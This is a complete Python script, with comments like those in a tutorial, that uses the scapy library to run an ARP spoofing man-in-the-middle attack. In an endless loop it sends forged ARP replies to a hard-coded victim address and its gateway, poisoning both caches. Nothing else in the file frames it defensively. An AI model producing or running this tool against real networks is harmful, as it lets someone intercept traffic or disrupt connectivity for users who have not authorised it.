#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip) # creating an ARP request object
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # creating an Ether object
    arp_request_broadcast = broadcast/arp_request # combining the two objects
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # sending the request and storing the answered and unanswered requests

    return answered_list[0][1].hwsrc # returning the MAC address of the target


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) # getting the MAC address of the target
    # In Terminal you can run python3 >>> import scapy.all as scapy >>> scapy.ls(scapy.ARP) to see the fields that can be modified
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # pdst = IP of the target, hwdst = MAC of the target, psrc = IP of the router
    scapy.send(packet, verbose = False) # sending the packet


sent_packets_count = 0
while True:
    spoof("192.168.10.198", "192.168.10.1")
    spoof("192.168.10.1", "192.168.10.198")
    sent_packets_count += 2
    print("[+] Sent",sent_packets_count,"packets.")
    time.sleep(2)